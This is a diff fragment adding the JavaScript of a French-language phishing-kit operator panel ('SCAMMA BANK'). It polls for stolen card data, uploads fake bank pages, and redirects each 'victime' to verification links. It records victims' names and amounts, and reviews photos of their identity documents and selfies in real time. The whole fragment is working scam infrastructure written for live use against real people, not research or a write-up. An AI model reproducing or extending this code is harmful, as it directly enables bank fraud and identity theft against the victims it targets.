+                    body: JSON.stringify({ action: 'redirect_bank' })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Action redirect_bank envoyée:', data);
+                    alert('✅ La carte a été supprimée et l\'utilisateur va être redirigé vers bank-index.html');
+                })
+                .catch(error => console.error('❌ Erreur:', error));
+            } else {
+                alert('❌ Le fichier bank-index.html n\'existe pas. Veuillez d\'abord l\'ajouter dans la rubrique SCAMMA BANK.');
+            }
+        })
+        .catch(error => {
+            alert('❌ Erreur lors de la vérification du fichier bank-index.html');
+        });
+}
+
+// Fonction pour mettre à jour card.json
+function updateCardJson(data) {
+    fetch('update_card.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('✅ card.json mis à jour:', result);
+    })
+    .catch(error => console.error('❌ Erreur mise à jour card.json:', error));
+}
+
+// Surveiller les nouvelles cartes via PHP
+function checkNewCardNotification() {
+    fetch('notification.json')
+        .then(response => {
+            if (!response.ok) throw new Error('Pas de notification');
+            return response.json();
+        })
+        .then(data => {
+            if (data && data.type === 'new_card') {
+                console.log('🔔 Nouvelle carte détectée!');
+                loadCardData();
+                // Supprimer la notification
+                fetch('notification.json', { method: 'DELETE' })
+                    .catch(err => console.error('Erreur suppression notif:', err));
+            }
+        })
+        .catch(() => {
+            // Pas de notification, c'est normal
+        });
+}
+
+// Vérifier toutes les 3 secondes
+setInterval(function() {
+    checkNewCardNotification();
+}, 3000);
+
+    function showModal(message, onConfirm) {
+        document.getElementById('modalMessage').textContent = message;
+        document.getElementById('actionModal').classList.add('show');
+        actionPending = onConfirm;
+        document.getElementById('confirmActionBtn').onclick = function() {
+            if (actionPending) actionPending();
+        };
+    }
+
+    function closeModal() {
+        document.getElementById('actionModal').classList.remove('show');
+        actionPending = null;
+    }
+
+    document.getElementById('actionModal').addEventListener('click', function(e) {
+        if (e.target === this) {
+            closeModal();
+        }
+    });
+
+    function saveCardData(cardData) {
+        const existing = localStorage.getItem('cardData');
+        let data = { sessions: [] };
+        if (existing) {
+            try {
+                data = JSON.parse(existing);
+                if (!data.sessions) data.sessions = [];
+            } catch (e) {
+                data = { sessions: [] };
+            }
+        }
+        data.sessions.push({
+            ...cardData,
+            timestamp: Date.now()
+        });
+        localStorage.setItem('cardData', JSON.stringify(data));
+        loadCardData();
+    }
+
+    window.saveCardData = saveCardData;
+
+    // Gestion de SCAMMA BANK
+function loadScammaData() {
+    const scammaBody = document.getElementById('scammaBody');
+    const scammaBadge = document.getElementById('scammaBadge');
+    
+    // Vérifier si le fichier existe via PHP
+    fetch('check_bank_file.php')
+        .then(response => response.json())
+        .then(data => {
+            if (data.exists) {
+                scammaBody.innerHTML = `
+                    <div class="card-data" style="border-left-color: #ff0000;">
+                        <div class="label">📂 Fichier bank-index.html</div>
+                        <div class="value" style="color: #28a745;">✅ Fichier présent</div>
+                        <div style="margin-top: 10px;">
+                            <button class="btn btn-refuser" onclick="supprimerBankFile()">🗑️ SUPPRIMER</button>
+                        </div>
+                    </div>
+                `;
+                scammaBadge.textContent = '1';
+            } else {
+                scammaBody.innerHTML = `
+                    <div class="empty">Aucun fichier bank-index.html</div>
+                    <div style="margin-top: 10px; text-align: center;">
+                        <button class="btn btn-push" onclick="ajouterBankFile()">➕ AJOUTER</button>
+                    </div>
+                `;
+                scammaBadge.textContent = '0';
+            }
+        })
+        .catch(error => {
+            scammaBody.innerHTML = `
+                <div class="empty">Erreur de vérification</div>
+                <div style="margin-top: 10px; text-align: center;">
+                    <button class="btn btn-push" onclick="ajouterBankFile()">➕ AJOUTER</button>
+                </div>
+            `;
+            scammaBadge.textContent = '0';
+        });
+}
+
+function ajouterBankFile() {
+    // Créer un input file caché
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '.html';
+    input.style.display = 'none';
+    
+    input.onchange = function(e) {
+        const file = e.target.files[0];
+        if (file && file.name === 'bank-index.html') {
+            const formData = new FormData();
+            formData.append('file', file);
+            
+            fetch('upload_bank.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('✅ Fichier bank-index.html uploadé avec succès !');
+                    loadScammaData();
+                } else {
+                    alert('❌ Erreur : ' + data.message);
+                }
+            })
+            .catch(error => {
+                alert('❌ Erreur lors de l\'upload');
+            });
+        } else {
+            alert('❌ Veuillez sélectionner un fichier nommé "bank-index.html"');
+        }
+    };
+    
+    document.body.appendChild(input);
+    input.click();
+    document.body.removeChild(input);
+}
+
+function supprimerBankFile() {
+    if (confirm('⚠️ Êtes-vous sûr de vouloir supprimer bank-index.html ?')) {
+        fetch('delete_bank.php', {
+            method: 'POST'
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('✅ Fichier bank-index.html supprimé !');
+                loadScammaData();
+            } else {
+                alert('❌ Erreur : ' + data.message);
+            }
+        })
+        .catch(error => {
+            alert('❌ Erreur lors de la suppression');
+        });
+    }
+}
+
+function loadRecupLog() {
+    fetch('get_facture_data.php')
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById('recupNumero').value = data.numero || '';
+                document.getElementById('recupMontant').value = data.montant || '';
+                document.getElementById('recupDate').value = data.date || '';
+            }
+            // Si le numéro n'est pas dans facture_data.json, essayer numero_data.json
+            if (!data.numero || data.numero === 'Non renseigné' || data.numero === '') {
+                fetch('get_numero.php')
+                    .then(r => r.json())
+                    .then(nd => {
+                        if (nd.success && nd.numero) {
+                            document.getElementById('recupNumero').value = nd.numero;
+                        }
+                    })
+                    .catch(() => {});
+            }
+        })
+        .catch(error => console.error('Erreur chargement recup log:', error));
+}
+
+function toggleRedirectionType() {
+    const type = document.getElementById('recupType').value;
+    const lienGroup = document.getElementById('lienVerifGroup');
+    if (type === 'link') {
+        lienGroup.style.display = 'block';
+    } else {
+        lienGroup.style.display = 'none';
+    }
+}
+
+function validerRecupLog() {
+    const type = document.getElementById('recupType').value;
+    
+    if (!type) {
+        alert('❌ Veuillez choisir un type de redirection');
+        return;
+    }
+    
+    let lien = '';
+    
+    if (type === 'link') {
+        lien = document.getElementById('recupLien').value.trim();
+        if (!lien) {
+            alert('❌ Veuillez entrer un lien de vérification');
+            return;
+        }
+    } else if (type === 'doc') {
+        lien = '/coriolis-trop_trop-percus/document.html';
+    }
+    
+    // Envoyer le lien au PHP pour rediriger la victime
+    fetch('save_recup_link.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ lien: lien })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ Redirection enregistrée ! La victime va être redirigée.');
+            document.getElementById('recupLien').value = '';
+            document.getElementById('recupType').value = '';
+            document.getElementById('lienVerifGroup').style.display = 'none';
+        } else {
+            alert('❌ Erreur : ' + data.message);
+        }
+    })
+    .catch(error => {
+        console.error('❌ Erreur:', error);
+        alert('❌ Erreur lors de l\'enregistrement');
+    });
+}
+
+// Rafraîchir les données RECUP LOG toutes les 3 secondes
+setInterval(loadRecupLog, 3000);
+
+// Charger au démarrage
+document.addEventListener('DOMContentLoaded', function() {
+    loadRecupLog();
+});
+
+function validerVictime() {
+    const nom = document.getElementById('nomVictime').value.trim();
+    const prenom = document.getElementById('prenomVictime').value.trim();
+    const prix = document.getElementById('prixVictime').value.trim();
+    
+    if (!nom || !prenom || !prix) {
+        alert('❌ Veuillez remplir tous les champs');
+        return;
+    }
+    
+    // Envoyer les données au PHP
+    fetch('save_victime.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            nom: nom,
+            prenom: prenom,
+            prix: prix
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ Victime enregistrée : ' + prenom + ' ' + nom + ' - ' + prix + '€');
+            console.log('✅ Données victime sauvegardées');
+        } else {
+            alert('❌ Erreur : ' + data.message);
+        }
+    })
+    .catch(error => {
+        console.error('❌ Erreur:', error);
+        alert('❌ Erreur lors de l\'enregistrement');
+    });
+}
+
+// === GESTION VERIF DOC ===
+function loadDocData() {
+    fetch('get_doc_data.php')
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                if (data.recto) {
+                    document.getElementById('docRectoPreview').innerHTML = 
+                        '<img src="' + data.recto + '" style="width:200px;height:120px;object-fit:cover;border-radius:8px;border:2px solid #8B4513;">';
+                }
+                if (data.verso) {
+                    document.getElementById('docVersoPreview').innerHTML = 
+                        '<img src="' + data.verso + '" style="width:200px;height:120px;object-fit:cover;border-radius:8px;border:2px solid #8B4513;">';
+                }
+            }
+        })
+        .catch(() => {});
+}
+
+function docValider() {
+    fetch('save_doc_action.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'valider' })
+    }).then(() => alert('✅ Validé ! La victime va être redirigée vers verif-selfie.html'));
+}
+
+function docRefuser() {
+    fetch('save_doc_action.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'refuser' })
+    }).then(() => alert('❌ Refusé. La victime devra reprendre les photos.'));
+}
+
+function docLink() {
+    const group = document.getElementById('docLinkGroup');
+    const confirmBtn = document.getElementById('docLinkConfirm');
+    if (group.style.display === 'none') {
+        group.style.display = 'block';
+        confirmBtn.style.display = 'block';
+    } else {
+        group.style.display = 'none';
+        confirmBtn.style.display = 'none';
+    }
+}
+
+function docConfirmerLien() {
+    const lien = document.getElementById('docLien').value.trim();
+    if (!lien) {
+        alert('❌ Veuillez entrer un lien');
+        return;
+    }
+    fetch('save_doc_action.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'link', lien: lien })
+    }).then(() => {
+        alert('✅ Lien envoyé ! La victime va être redirigée.');
+        document.getElementById('docLien').value = '';
+        document.getElementById('docLinkGroup').style.display = 'none';
+        document.getElementById('docLinkConfirm').style.display = 'none';
+    });
+}
+
+// Rafraîchir les documents toutes les 3 secondes
+setInterval(loadDocData, 3000);
+document.addEventListener('DOMContentLoaded', function() {
+    loadDocData();
+});
+
+// Charger les données SCAMMA au démarrage
+document.addEventListener('DOMContentLoaded', function() {
+    // ... vos autres chargements ...
+    loadScammaData();
+});
+
+    console.log('✅ Panel chargé. En attente des sessions...');
+</script>
+</body>
+</html>
